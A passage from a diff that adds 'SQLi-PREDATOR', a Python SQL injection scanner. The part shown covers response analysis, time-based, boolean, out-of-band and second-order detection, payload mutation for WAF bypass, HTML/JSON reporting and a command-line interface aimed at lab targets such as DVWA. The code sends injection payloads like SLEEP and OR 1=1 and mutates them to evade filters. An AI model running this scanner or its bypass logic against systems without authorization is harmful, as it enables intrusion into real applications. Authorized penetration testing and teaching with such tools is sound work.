+                    # Check if marker activated
+                    if "s2_" in body or any(m in body for m in ["marker_'", "marker", " SLEEP(3) --"]):
+                        log.warning(f"  [!] Second-order SQLi confirmed! Marker activated on {url}")
+                        # Try to detect time-based activation
+                        if "SLEEP" in rec.payload_planted:
+                            resp2 = self.session.get(url, timeout=15)
+                            if resp2.elapsed.total_seconds() >= 3:
+                                finding = SQLiFinding(
+                                    url=url, parameter=rec.db_table_hint,
+                                    vector="SecondOrder",
+                                    detection_method=str(DetectionMethod.SECOND_ORDER),
+                                    payload_used=rec.payload_planted,
+                                    confidence=0.85,
+                                    severity="High", cvss_score=7.5,
+                                    is_second_order=True,
+                                    second_order_record=asdict(rec),
+                                )
+                                results.append(finding)
+                                with self._lock:
+                                    self.findings.append(finding)
+                    time.sleep(0.5)
+                except Exception:
+                    continue
+
+        return results
+
+    # =========================================================================
+    #  RESPONSE ANALYSIS
+    # =========================================================================
+
+    def _analyze_response(
+        self,
+        resp: Optional[requests.Response],
+        elapsed: float,
+        url: str,
+        param: str,
+        injection_vector: str,
+        payload: Payload,
+        bypass: BypassTechnique,
+        baseline: Optional[BaselineResponse] = None,
+    ) -> Optional[SQLiFinding]:
+        """Analyze a single response for SQLi indicators."""
+        if resp is None:
+            # Timeout — possible time-based SQLi
+            return SQLiFinding(
+                url=url, parameter=param, vector=injection_vector,
+                detection_method=str(DetectionMethod.TIME_BASED_STATISTICAL),
+                payload_used=payload.value,
+                bypass_technique=bypass.name,
+                confidence=0.5,
+                severity="Medium", cvss_score=6.0,
+                test_time=elapsed,
+                time_delay_detected=True,
+                time_delay_seconds=elapsed - (baseline.response_time if baseline else 0),
+                vulnerability_class="Time-Based Blind SQL Injection",
+            )
+
+        finding = SQLiFinding(
+            url=url, parameter=param, vector=injection_vector,
+            payload_used=payload.value, payload_complexity=payload.base_complexity,
+            bypass_technique=bypass.name,
+            db_type_hint="unknown",
+            detection_method=str(DetectionMethod.CONTENT_DIFF),
+        )
+
+        # Baseline data
+        if baseline:
+            finding.baseline_status = baseline.status_code
+            finding.baseline_length = baseline.content_length
+            finding.baseline_time = baseline.response_time
+
+        # Response data
+        finding.test_status = resp.status_code
+        finding.test_length = len(resp.content)
+        finding.test_time = elapsed
+        finding.raw_response_headers = dict(resp.headers)
+        finding.raw_response_snippet = resp.text[:500]
+
+        # 1. Error signature detection
+        has_errors, sigs_found, db_hint = self._check_error_signatures(resp.text)
+        finding.has_sql_errors = has_errors
+        finding.error_signatures_matched = sigs_found
+        if sigs_found:
+            finding.error_signature_found = sigs_found[0]
+        if db_hint != "unknown":
+            finding.db_type_hint = db_hint
+
+        # 2. Content diff analysis
+        if baseline:
+            len_diff = abs(finding.test_length - baseline.content_length)
+            if baseline.content_length > 0:
+                finding.response_difference_percent = (len_diff / baseline.content_length) * 100.0
+
+            # Boolean classification
+            if payload.category == PayloadCategory.BOOLEAN_BASED and baseline.content_hash:
+                current_hash = hashlib.md5(resp.content).hexdigest()
+                if current_hash != baseline.content_hash:
+                    if "OR 1=1" in payload.value or "OR 'a'='a'" in payload.value or "' AND 1=1" in payload.value:
+                        finding.is_boolean_positive = True
+                        finding.detection_method = str(DetectionMethod.BOOLEAN_BASED)
+                        finding.vulnerability_class = "Boolean-Based Blind SQL Injection"
+                        finding.bool_true_length = finding.test_length
+                    elif "OR 1=2" in payload.value or "OR 'a'='b'" in payload.value or "' AND 1=2" in payload.value:
+                        finding.is_boolean_positive = False
+                        finding.detection_method = str(DetectionMethod.BOOLEAN_BASED)
+                        finding.vulnerability_class = "Boolean-Based Blind SQL Injection"
+                        finding.bool_false_length = finding.test_length
+
+        # 3. Time-based statistical analysis
+        key = self._param_key(url, param, injection_vector)
+        self.timing_analyzer.record_baseline(key, baseline.response_time if baseline else elapsed)
+        self.timing_analyzer.record_test(key, payload.value, elapsed)
+
+        is_sig, z_score, p_value, n_samples = self.timing_analyzer.analyze(key, payload.value)
+        if is_sig or (baseline and elapsed - baseline.response_time >= self.profile.time_threshold):
+            finding.time_delay_detected = True
+            finding.time_delay_seconds = elapsed - (baseline.response_time if baseline else 0)
+            finding.timing_z_score = z_score
+            finding.timing_p_value = p_value
+            finding.timing_samples_collected = n_samples
+            finding.detection_method = str(DetectionMethod.TIME_BASED_STATISTICAL)
+            finding.vulnerability_class = "Time-Based Blind SQL Injection (Statistical)"
+            finding.confidence = max(finding.confidence, 0.7)
+
+        # 4. Union probe detection
+        if payload.category == PayloadCategory.UNION_PROBE:
+            if finding.response_difference_percent > 30 or finding.has_sql_errors:
+                finding.detection_method = str(DetectionMethod.UNION_PROBE)
+                finding.vulnerability_class = "UNION-Based SQL Injection"
+
+        # 5. Error-based detection
+        if finding.has_sql_errors:
+            finding.detection_method = str(DetectionMethod.ERROR_BASED)
+            finding.vulnerability_class = f"Error-Based SQL Injection ({finding.db_type_hint.upper()})"
+
+        # 6. OOB detection
+        if self.oob and payload.requires_oob_domain:
+            interactions = self.oob.interactions
+            if interactions:
+                finding.oob_interaction_id = interactions[-1].get("unique-id", "")
+                finding.oob_via = interactions[-1].get("protocol", "dns")
+                finding.detection_method = str(DetectionMethod.OOB_DNS)
+                finding.vulnerability_class = f"Out-of-Band SQL Injection ({finding.oob_via.upper()})"
+                finding.confidence = 0.95  # OOB is definitive
+
+        # 7. Status code anomaly
+        if baseline and finding.test_status != finding.baseline_status:
+            if not finding.detection_method or finding.detection_method == str(DetectionMethod.CONTENT_DIFF):
+                finding.detection_method = str(DetectionMethod.STATUS_CODE_ANOMALY)
+
+        # Calculate final confidence
+        finding.confidence = max(finding.confidence, self._score_confidence(finding))
+
+        if finding.confidence < 0.2:
+            return None  # noise
+
+        # Severity
+        cvss_map = {
+            DetectionMethod.ERROR_BASED: 6.5,
+            DetectionMethod.BOOLEAN_BASED: 7.5,
+            DetectionMethod.TIME_BASED_STATISTICAL: 8.0,
+            DetectionMethod.CONTENT_DIFF: 5.0,
+            DetectionMethod.UNION_PROBE: 8.5,
+            DetectionMethod.OOB_DNS: 9.0,
+            DetectionMethod.OOB_HTTP: 9.0,
+            DetectionMethod.SECOND_ORDER: 7.5,
+            DetectionMethod.STACKED_QUERY: 8.5,
+            DetectionMethod.STATUS_CODE_ANOMALY: 4.0,
+        }
+        try:
+            base_score = cvss_map.get(DetectionMethod[finding.detection_method.upper().replace("-", "_")], 5.0)
+        except (KeyError, ValueError):
+            base_score = 5.0
+
+        # Adjust severity for OOB
+        if finding.oob_interaction_id and finding.oob_via:
+            base_score = 9.0  # OOB = near-critical
+
+        finding.cvss_score = round(base_score * finding.confidence, 2)
+        finding.severity = Severity.from_score(finding.cvss_score).value
+
+        # Generate educational content
+        self._generate_education(finding)
+
+        return finding
+
+    def _generate_education(self, finding: SQLiFinding) -> None:
+        """Generate educational explanation and remediation."""
+        det = finding.detection_method
+        vuln_class = finding.vulnerability_class
+        db = finding.db_type_hint.upper()
+        payload_snippet = finding.payload_used[:80]
+
+        explanation_map = {
+            "ERROR_BASED": (
+                f"Error-Based SQL Injection detected on parameter '{finding.parameter}'. "
+                f"The payload '{payload_snippet}' triggered database error messages in the HTTP response. "
+                f"Error signatures matched: {finding.error_signatures_matched[:3]}. "
+                f"This indicates the database backend is {db}. "
+                f"Error-based SQLi occurs when database error messages are returned to the client. "
+                f"An attacker can craft queries that force the database to return sensitive data "
+                f"(version, user, database name, table structure) within error messages themselves — "
+                f"e.g., using EXTRACTVALUE, UPDATEXML, or CAST operations that fail informatively."
+            ),
+            "BOOLEAN_BASED": (
+                f"Boolean-Based Blind SQL Injection detected on '{finding.parameter}'. "
+                f"The payload '{payload_snippet}' produced a {finding.response_difference_percent:.1f}% "
+                f"content change. TRUE response: {finding.bool_true_length} bytes, "
+                f"FALSE response: {finding.bool_false_length} bytes. "
+                f"In boolean-based blind SQLi, the attacker cannot see query output or errors, "
+                f"but can ask the database true/false questions and observe page content differences. "
+                f"Information is extracted one bit at a time by comparing responses to TRUE vs FALSE conditions."
+            ),
+            "TIME_BASED_STATISTICAL": (
+                f"Time-Based Blind SQL Injection detected with statistical confidence. "
+                f"Payload '{payload_snippet}' caused {finding.time_delay_seconds:.2f}s delay "
+                f"(Z-score: {finding.timing_z_score:.2f}, p-value: {finding.timing_p_value:.4f}). "
+                f"The system was tested {finding.timing_samples_collected} times per payload for statistical validity. "
+                f"Time-based blind SQLi is used when no error or content differences are visible. "
+                f"An attacker conditions database delay functions (SLEEP, pg_sleep, WAITFOR DELAY) "
+                f"on boolean questions — delay = true, no delay = false."
+            ),
+            "UNION_PROBE": (
+                f"UNION-Based SQL Injection probe detected. Payload '{payload_snippet}' caused "
+                f"a {finding.response_difference_percent:.1f}% response change. "
+                f"UNION SELECT attempts to append results from a second query to the original result set. "
+                f"The attacker first determines column count by adding NULLs until the query succeeds, "
+                f"then replaces NULLs with data retrieval functions (VERSION(), DATABASE(), table_name) "
+                f"to extract data directly into the application output."
+            ),
+            "OOB_DNS": (
+                f"Out-of-Band SQL Injection confirmed via DNS callback. "
+                f"Payload triggered a DNS resolution to {finding.oob_via} domain. "
+                f"OOB SQLi is the most definitive detection class — an external callback proves "
+                f"the database server executed injected SQL and initiated a network connection. "
+                f"This technique works when direct output and error messages are suppressed "
+                f"but the database has network capabilities (UTL_HTTP, xp_dirtree, COPY TO PROGRAM)."
+            ),
+            "SECOND_ORDER": (
+                f"Second-Order SQL Injection detected. A payload was planted in a writable field "
+                f"and later triggered when the stored value was used in a query on a different endpoint. "
+                f"Second-order SQLi is the most difficult to detect automatically because the injection "
+                f"and trigger happen in separate requests, often in separate sessions. "
+                f"The planted marker '{payload_snippet}' was activated when the application "
+                f"retrieved and concatenated the stored value into a database query without parameterization."
+            ),
+        }
+
+        # Build explanation
+        for key, explanation in explanation_map.items():
+            if key in det.upper().replace("-", "_"):
+                finding.ai_explanation = explanation
+                break
+
+        if not finding.ai_explanation:
+            finding.ai_explanation = (
+                f"SQL Injection indicators detected on parameter '{finding.parameter}' "
+                f"at {finding.url}. Payload '{payload_snippet}' produced "
+                f"HTTP {finding.test_status} (baseline: {finding.baseline_status}) with "
+                f"{finding.response_difference_percent:.1f}% content change. "
+                f"This suggests user input is reaching an SQL query without proper sanitization."
+            )
+
+        # Remediation — comprehensive
+        finding.remediation_steps = [
+            "1. PARAMETERIZED QUERIES (Prepared Statements): Use parameterized queries for ALL database operations. "
+            "This is the ONLY complete defense against SQL injection. SQL code and data are never mixed. "
+            "Example (Python/MySQL): cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))",
+            "2. INPUT VALIDATION: Implement strict allowlist-based validation for expected input formats "
+            "(numeric IDs, UUIDs, email patterns, etc.). Reject input that doesn't match.",
+            "3. DATABASE ERROR HANDLING: Disable all detailed database error messages in production. "
+            "Configure generic error pages and log errors server-side only.",
+            "4. LEAST PRIVILEGE: Use a dedicated database account with MINIMUM permissions "
+            "(only SELECT, INSERT, UPDATE on specific tables). Never connect as root/SA/admin.",
+            f"5. WAF DEPLOYMENT: Deploy ModSecurity, AWS WAF, or Cloudflare WAF with SQLi rule sets. "
+            f"Test bypass techniques like comment injection, case mutation, and encoding.",
+            "6. REGULAR SCANNING: Integrate automated SQLi detection into CI/CD pipelines. "
+            "Run scans on every build and before production deployments.",
+            f"7. PARAMETER '{finding.parameter}' on {finding.url}: "
+            f"Specifically review this parameter. If it expects an integer, cast it. If string, use parameterized queries.",
+            "8. STORED PROCEDURES: Use parameterized stored procedures as an additional layer. "
+            "Ensure procedures themselves use parameterization internally.",
+            "9. OUTPUT ENCODING: Contextually encode all data before rendering to prevent XSS "
+            "as a secondary impact of SQL injection.",
+            "10. AUDIT LOGGING: Log all database queries with parameter values for forensic analysis.",
+        ]
+
+    def _get_payload_variants_for_testing(
+        self,
+        field: 'PayloadField',
+        method: str = "GET",
+        payloads: Optional[List[Payload]] = None,
+    ) -> List[Tuple[Payload, BypassTechnique]]:
+        """Generate payload variants with bypass techniques for a parameter."""
+        if payloads is None:
+            payloads = PAYLOAD_CORE
+
+        variants: List[Tuple[Payload, BypassTechnique]] = []
+
+        for base_payload in payloads:
+            # Skip OOB payloads if no OOB configured
+            if base_payload.requires_oob_domain and not self.oob:
+                continue
+
+            # For each payload, generate variants at different complexity levels
+            max_complexity = min(7, base_payload.base_complexity + 3)
+
+            # Raw version (always include)
+            variants.append((base_payload, BypassTechnique.NONE))
+
+            # If the payload is already complex, we might skip some variants
+            if base_payload.base_complexity >= 5:
+                continue
+
+            # Generate transformed variants
+            transformed = PayloadTransformer.generate_variants(
+                base_payload.value,
+                count=min(3, max_complexity - base_payload.base_complexity + 1),
+                max_complexity=max_complexity,
+            )
+
+            for variant in transformed:
+                new_payload = Payload(
+                    value=variant,
+                    category=base_payload.category,
+                    description=base_payload.description + " [mutated]",
+                    db_types=base_payload.db_types,
+                    base_complexity=base_payload.base_complexity + 1,
+                )
+                # Determine which bypass technique was used
+                if variant != base_payload.value:
+                    technique = BypassTechnique.POLYMORPHIC
+                    if variant != variant.lower() and variant != variant.upper():
+                        technique = BypassTechnique.CASE_VARIATION
+                    if "/**/" in variant:
+                        technique = BypassTechnique.COMMENT_INJECTION
+                    if "0x" in variant:
+                        technique = BypassTechnique.HEX_ENCODING
+                    if "%25" in variant:
+                        technique = BypassTechnique.DOUBLE_URL_ENCODING
+                    if "%" in variant and "%25" not in variant:
+                        technique = BypassTechnique.URL_ENCODING
+                    variants.append((new_payload, technique))
+
+        # Shuffle to reduce deterministic WAF blocking
+        random.shuffle(variants)
+        return variants
+
+# =============================================================================
+#  MASTER SCANNER
+# =============================================================================
+
+class Scanner:
+    def __init__(self, profile: ScanProfile):
+        self.profile = profile
+        self.crawler = Crawler(profile)
+        self.oob_client: Optional[OOBClient] = None
+        if profile.oob_domain:
+            self.oob_client = OOBClient(profile.oob_domain)
+        self.engine = DetectionEngine(profile, self.oob_client)
+
+    def run(self) -> List[SQLiFinding]:
+        """Execute full scan workflow."""
+        print(BANNER)
+        print(AUTH_PROMPT)
+        log.info(f"Target: {self.profile.target_url}")
+        log.info(f"Payload registry: {len(PAYLOAD_CORE)} base payloads (polymorphic expansion applies)")
+        log.info(f"Crawl depth: {self.profile.crawl_depth}")
+        log.info(f"Time-based statistical samples: {self.profile.time_samples_per_payload}")
+        log.info(f"Headers: {'ALL (hat tip to CVE-2025 fuzzing)' if self.profile.test_all_headers else 'Standard'}")
+        log.info(f"Second-order detection: {'ENABLED' if self.profile.test_second_order else 'Disabled'}")
+        log.info(f"OOB detection: {'ENABLED via ' + self.profile.oob_domain if self.profile.oob_domain else 'Disabled'}")
+        if self.oob_client:
+            log.info(f"  OOB callback domain: {self.oob_client.start()}")
+        log.info("─" * 70)
+
+        # ── Phase 1: Crawl ──
+        log.info("\n[Phase 1] Crawling target...")
+        self.crawler.crawl(self.profile.target_url)
+        log.info(f"  URLs visited: {len(self.crawler.visited)}")
+        log.info(f"  Forms found: {len(self.crawler.discovered_forms)}")
+        log.info(f"  URL params found: {len(self.crawler.discovered_params)}")
+
+        # ── Phase 2: Baseline ──
+        log.info("\n[Phase 2] Establishing baselines...")
+        for form in self.crawler.discovered_forms:
+            key = form.action.split("?")[0]
+            if key not in self.engine.baselines:
+                if form.method == "POST":
+                    clean_data = {i.name: i.value or "test" for i in form.inputs if not i.is_submit}
+                    b = self.crawler.get_baseline(form.action, "POST", clean_data)
+                else:
+                    b = self.crawler.get_baseline(form.action)
+                if b:
+                    self.engine.baselines[key] = b
+                    log.info(f"  Baseline: {key} ({b.content_length}b, {b.response_time:.2f}s)")
+
+        # ── Phase 3: Test forms ──
+        log.info(f"\n[Phase 3] Testing {len(self.crawler.discovered_forms)} forms...")
+        for i, form in enumerate(self.crawler.discovered_forms):
+            log.info(f"  Form [{i+1}/{len(self.crawler.discovered_forms)}]: {form.action} ({form.method})")
+            self.engine.test_form(form)
+
+        # ── Phase 4: Test URL params ──
+        log.info(f"\n[Phase 4] Testing {len(self.crawler.discovered_params)} URL parameters...")
+        for i, (url, param, val) in enumerate(self.crawler.discovered_params):
+            log.info(f"  Param [{i+1}/{len(self.crawler.discovered_params)}]: {param} on {url[:70]}")
+            self.engine.test_param(url, param, val)
+
+        # ── Phase 5: Test headers ──
+        if self.profile.test_all_headers:
+            log.info("\n[Phase 5] Testing HTTP headers...")
+            for url in list(self.crawler.visited)[:5]:
+                self.engine.test_headers(url)
+                self.engine.test_cookies(url)
+
+        # ── Phase 6: Second-order ──
+        if self.profile.test_second_order:
+            log.info("\n[Phase 6] Testing second-order SQL injection...")
+            self.engine.test_second_order(self.crawler)
+
+        # ── Cleanup ──
+        if self.oob_client:
+            interactions = self.oob_client.stop()
+            log.info(f"OOB interactions collected: {len(interactions)}")
+
+        log.info("─" * 70)
+        log.info(f"Scan complete. Total findings: {len(self.engine.findings)}")
+
+        return self.engine.findings
+
+# =============================================================================
+#  REPORT GENERATOR — Dark-mode HTML + JSON
+# =============================================================================
+
+class ReportGenerator:
+    @staticmethod
+    def to_json(findings: List[SQLiFinding], path: str) -> str:
+        data = {
+            "scan_metadata": {
+                "tool": f"SQLi-PREDATOR v{VERSION} ({CODENAME})",
+                "timestamp": datetime.now(timezone.utc).isoformat(),
+                "total_findings": len(findings),
+                "severity_summary": ReportGenerator._severity_summary(findings),
+            },
+            "findings": [asdict(f) for f in findings],
+        }
+        with open(path, "w") as f:
+            json.dump(data, f, indent=2, default=str)
+        log.info(f"JSON report: {path}")
+        return path
+
+    @staticmethod
+    def to_html(findings: List[SQLiFinding], path: str) -> str:
+        sc = ReportGenerator._severity_summary(findings)
+
+        fhtml = ""
+        for i, f in enumerate(findings, 1):
+            severity_color = {
+                "Critical": "#dc3545", "High": "#fd7e14", "Medium": "#ffc107",
+                "Low": "#28a745", "Info": "#17a2b8",
+            }.get(f.severity, "#6c757d")
+
+            method_icons = {
+                "ERROR_BASED": "⚠️", "BOOLEAN_BASED": "🔍", "TIME_BASED_STATISTICAL": "⏱️",
+                "UNION_PROBE": "🔗", "OOB_DNS": "🌐", "OOB_HTTP": "🌐",
+                "SECOND_ORDER": "🔄", "STACKED_QUERY": "📚",
+            }
+            icon = "💉"
+            for method_key, method_icon in method_icons.items():
+                if method_key in f.detection_method.upper().replace("-", "_"):
+                    icon = method_icon
+                    break
+
+            fhtml += f"""
+            <div class="finding" style="border-left: 4px solid {severity_color};">
+                <div class="fh">
+                    <span class="badge" style="background:{severity_color};">{f.severity}</span>
+                    <span class="badge sec">{icon} {f.detection_method.replace('_',' ').title()}</span>
+                    <span class="badge cvss">CVSS {f.cvss_score}</span>
+                    <span class="badge conf">Conf: {f.confidence:.0%}</span>
+                </div>
+                <h3>#{i}: {html.escape(f.parameter)} on <code>{html.escape(f.url[:80])}</code></h3>
+                <table>
+                    <tr><td>Vector</td><td><code>{f.vector}</code></td></tr>
+                    <tr><td>Payload</td><td><code class="payload">{html.escape(f.payload_used)}</code></td></tr>
+                    <tr><td>Complexity</td><td>Level {f.payload_complexity}/7</td></tr>
+                    <tr><td>Bypass</td><td>{f.bypass_technique.replace('_',' ').title()}</td></tr>
+                    <tr><td>DB Type</td><td>{f.db_type_hint}</td></tr>
+                    <tr><td>Baseline</td><td>HTTP {f.baseline_status} | {f.baseline_length}b | {f.baseline_time:.2f}s</td></tr>
+                    <tr><td>Test</td><td>HTTP {f.test_status} | {f.test_length}b | {f.test_time:.2f}s</td></tr>
+                    <tr><td>Content Diff</td><td>{f.response_difference_percent:.1f}%</td></tr>
+            """
+            if f.has_sql_errors:
+                fhtml += f'<tr><td>Errors</td><td style="color:#dc3545;">{html.escape(" | ".join(f.error_signatures_matched[:5]))}</td></tr>\n'
+            if f.time_delay_detected:
+                fhtml += f'<tr><td>Delay</td><td style="color:#fd7e14;">{f.time_delay_seconds:.2f}s (Z={f.timing_z_score:.2f}, p={f.timing_p_value:.4f})</td></tr>\n'
+            if f.oob_interaction_id:
+                fhtml += f'<tr><td>OOB</td><td style="color:#dc3545;">Callback via {f.oob_via} | ID: {f.oob_interaction_id}</td></tr>\n'
+            if f.is_second_order:
+                fhtml += '<tr><td>Second-Order</td><td style="color:#fd7e14;">Confirmed stored payload trigger</td></tr>\n'
+            if f.is_boolean_positive is not None:
+                fhtml += f'<tr><td>Boolean</td><td>True={f.bool_true_length}b | False={f.bool_false_length}b</td></tr>\n'
+            fhtml += "</table>"
+
+            fhtml += f"""
+                <details>
+                    <summary>📖 Educational Explanation</summary>
+                    <div class="explain"><p>{html.escape(f.ai_explanation)}</p></div>
+                </details>
+                <details>
+                    <summary>🛡️ Remediation Checklist</summary>
+                    <ol>"""
+            for s in f.remediation_steps:
+                fhtml += f"<li>{html.escape(s)}</li>\n"
+            fhtml += "</ol></details></div><hr>"
+
+        html_report = f"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>SQLi-PREDATOR v{VERSION} — Scan Report</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0e14;color:#c9d1d9;padding:20px;line-height:1.6}}
+.container{{max-width:1200px;margin:0 auto}}
+h1{{color:#58a6ff;margin-bottom:5px}}
+h2{{color:#c9d1d9;margin:20px 0 10px}}
+h3{{color:#58a6ff;margin:10px 0}}
+.header{{border-bottom:1px solid #21262d;padding-bottom:20px;margin-bottom:20px}}
+.summary{{display:flex;gap:12px;flex-wrap:wrap;margin:20px 0}}
+.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;flex:1;min-width:130px;text-align:center}}
+.card .count{{font-size:2.2em;font-weight:bold}}
+.finding{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin:15px 0}}
+.fh{{display:flex;gap:8px;margin-bottom:15px;flex-wrap:wrap}}
+.badge{{display:inline-block;padding:4px 12px;border-radius:20px;font-weight:600;font-size:11px;text-transform:uppercase}}
+.sec{{background:#1f6feb33;color:#58a6ff}}
+.cvss{{background:#21262d;color:#f0c674}}
+.conf{{background:#21262d;color:#8b949e}}
+table{{width:100%;border-collapse:collapse;margin:10px 0}}
+td{{padding:6px 10px;border-bottom:1px solid #21262d;vertical-align:top}}
+td:first-child{{width:140px;color:#8b949e;white-space:nowrap;font-weight:600}}
+code{{background:#21262d;padding:2px 6px;border-radius:4px;font-size:12px;word-break:break-all;color:#f0c674}}
+.payload{{font-size:11px;color:#f0c674;word-break:break-all}}
+details{{margin:10px 0;background:#0d1117;border-radius:6px;padding:10px 15px}}
+summary{{cursor:pointer;font-weight:600;padding:5px 0;color:#58a6ff}}
+.explain p,.remediation li{{color:#8b949e;margin:5px 0}}
+hr{{border:none;border-top:1px solid #21262d;margin:20px 0}}
+.footer{{text-align:center;color:#8b949e;font-size:12px;margin-top:40px}}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="header">
+<h1>🦅 SQLi-PREDATOR v{VERSION} — {CODENAME}</h1>
+<p><strong>Generated:</strong> {datetime.now(timezone.utc).isoformat()}</p>
+<p><strong>Total Findings:</strong> {len(findings)}</p>
+</div>
+<h2>Severity Summary</h2>
+<div class="summary">
+<div class="card"><div class="count" style="color:#dc3545;">{sc.get("Critical",0)}</div><div>Critical</div></div>
+<div class="card"><div class="count" style="color:#fd7e14;">{sc.get("High",0)}</div><div>High</div></div>
+<div class="card"><div class="count" style="color:#ffc107;">{sc.get("Medium",0)}</div><div>Medium</div></div>
+<div class="card"><div class="count" style="color:#28a745;">{sc.get("Low",0)}</div><div>Low</div></div>
+<div class="card"><div class="count" style="color:#17a2b8;">{sc.get("Info",0)}</div><div>Info</div></div>
+</div>
+<h2>Detailed Findings</h2>
+{fhtml}
+<div class="footer">
+<p>Generated by HackerAI SQLi-PREDATOR v{VERSION} ({CODENAME}) — Educational Use Only</p>
+<p>⚠ Contains sensitive vulnerability information. Authorized personnel only.</p>
+</div>
+</div>
+</body>
+</html>
+"""
+        with open(path, "w") as f:
+            f.write(html_report)
+        log.info(f"HTML report: {path}")
+        return path
+
+    @staticmethod
+    def _severity_summary(findings: List[SQLiFinding]) -> Dict[str, int]:
+        c: Dict[str, int] = {}
+        for f in findings:
+            c[f.severity] = c.get(f.severity, 0) + 1
+        return c
+
+    @staticmethod
+    def print_summary(findings: List[SQLiFinding]) -> None:
+        if not findings:
+            log.info("\n  ✅ No SQL injection vulnerabilities detected.")
+            return
+        sc = ReportGenerator._severity_summary(findings)
+        log.info("═" * 70)
+        log.info("SCAN COMPLETE — FINDINGS SUMMARY")
+        log.info("═" * 70)
+        log.info(f"Total: {len(findings)}")
+        for s in ["Critical", "High", "Medium", "Low", "Info"]:
+            if sc.get(s, 0) > 0:
+                log.info(f"  {s}: {sc[s]}")
+
+        log.info("\nTop findings:")
+        sorted_f = sorted(findings, key=lambda f: f.cvss_score, reverse=True)
+        for f in sorted_f[:15]:
+            method = f.detection_method.replace('_', ' ').title()[:25]
+            log.info(f"  [{f.severity:<8}] CVSS {f.cvss_score:<5.1f} | {method:25} | "
+                     f"{f.url[:60]} | {f.parameter}")
+            if f.time_delay_detected:
+                log.info(f"          ⏱ Delay: {f.time_delay_seconds:.2f}s | Z={f.timing_z_score:.2f} | p={f.timing_p_value:.4f}")
+            if f.has_sql_errors:
+                log.info(f"          ⚠ Error: {f.error_signature_found[:60]}")
+            if f.oob_interaction_id:
+                log.info(f"          🌐 OOB callback via {f.oob_via}")
+            if f.is_second_order:
+                log.info(f"          🔄 Second-order (stored → triggered)")
+            log.info(f"          Payload: {f.payload_used[:80]}")
+
+# =============================================================================
+#  CLI
+# =============================================================================
+
+@dataclass
+class PayloadField:
+    name: str
+    input_type: str = "text"
+
+def parse_args() -> argparse.Namespace:
+    p = argparse.ArgumentParser(
+        description=f"SQLi-PREDATOR v{VERSION} — Advanced SQL Injection Detection Engine ({CODENAME})",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=f"""
+Examples:
+  python sqli_predator.py -t http://localhost/DVWA --auth admin:password
+  python sqli_predator.py -t http://localhost:3000 --all-headers --oob interactsh.com
+  python sqli_predator.py -t http://192.168.56.101/bWAPP --second-order -o bWAPP_scan
+  python sqli_predator.py -t http://localhost/DVWA -v --delay 0.2 --time-samples 5
+        """
+    )
+    p.add_argument("-t", "--target", required=True, help="Target URL")
+    p.add_argument("-d", "--crawl-depth", type=int, default=2, help="Crawl depth (default: 2)")
+    p.add_argument("--delay", type=float, default=0.5, help="Request delay seconds (default: 0.5)")
+    p.add_argument("--timeout", type=int, default=30, help="Request timeout (default: 30)")
+    p.add_argument("--threads", type=int, default=8, help="Threads (default: 8)")
+    p.add_argument("--time-threshold", type=float, default=3.0, help="Time-based threshold (default: 3.0s)")
+    p.add_argument("--time-samples", type=int, default=3, help="Statistical samples per payload (default: 3)")
+    p.add_argument("--cookie", help="Auth cookie: 'PHPSESSID=abc; security=low'")
+    p.add_argument("--auth", help="Basic auth: 'user:pass'")
+    p.add_argument("--auth-header", help="Custom auth header: 'Bearer token123'")
+    p.add_argument("-o", "--output", default="sqli_predator_report", help="Output file prefix")
+    p.add_argument("--format", choices=["json", "html", "both"], default="both")
+    p.add_argument("--all-headers", action="store_true", help="Test all HTTP headers (UA, Referer, XFF, Cookies)")
+    p.add_argument("--second-order", action="store_true", help="Enable second-order SQLi detection (plant+trigger)")
+    p.add_argument("--oob", help="OOB domain for callback detection (e.g., interactsh.com)")
+    p.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
+    p.add_argument("--accept", action="store_true", help="Auto-accept authorization (non-interactive)")
+    return p.parse_args()
+
+def main() -> int:
+    args = parse_args()
+    if args.verbose:
+        log.setLevel(logging.DEBUG)
+        for h in log.handlers:
+            h.setLevel(logging.DEBUG)
+
+    # Authorization
+    if not args.accept:
+        print(AUTH_PROMPT)
+        print("Type 'I ACCEPT' and press Enter to continue: ", end="")
+        try:
+            r = input().strip()
+        except (KeyboardInterrupt, EOFError):
+            print("\nExiting.")
+            return 0
+        if r != "I ACCEPT":
+            log.error("Authorization declined.")
+            return 1
+        print()
+
+    # Build profile
+    auth_creds = None
+    if args.auth:
+        parts = args.auth.split(":", 1)
+        if len(parts) == 2:
+            auth_creds = (parts[0], parts[1])
+        else:
+            log.error("Invalid auth format. Use user:pass")
+            return 1
+
+    auth_header = None
+    if args.auth_header:
+        parts = args.auth_header.split(":", 1)
+        if len(parts) == 2:
+            auth_header = {parts[0].strip(): parts[1].strip()}
+
+    profile = ScanProfile(
+        target_url=args.target,
+        auth_cookie=args.cookie,
+        auth_header=auth_header,
+        auth_credentials=auth_creds,
+        crawl_depth=args.crawl_depth,
+        request_delay=args.delay,
+        timeout=args.timeout,
+        max_threads=args.threads,
+        time_threshold=args.time_threshold,
+        time_samples_per_payload=args.time_samples,
+        test_all_headers=args.all_headers,
+        test_second_order=args.second_order,
+        oob_domain=args.oob,
+    )
+
+    # Run
+    try:
+        scanner = Scanner(profile)
+        findings = scanner.run()
+    except KeyboardInterrupt:
+        log.warning("Interrupted.")
+        return 130
+    except Exception as e:
+        log.error(f"Fatal: {e}", exc_info=args.verbose)
+        return 1
+
+    # Reports
+    json_path = f"{args.output}.json"
+    html_path = f"{args.output}.html"
+    if args.format in ("json", "both"):
+        ReportGenerator.to_json(findings, json_path)
+    if args.format in ("html", "both"):
+        ReportGenerator.to_html(findings, html_path)
+
+    ReportGenerator.print_summary(findings)
+    log.info(f"Reports: {json_path}, {html_path}")
+    return 0
+
+if __name__ == "__main__":
+    sys.exit(main())
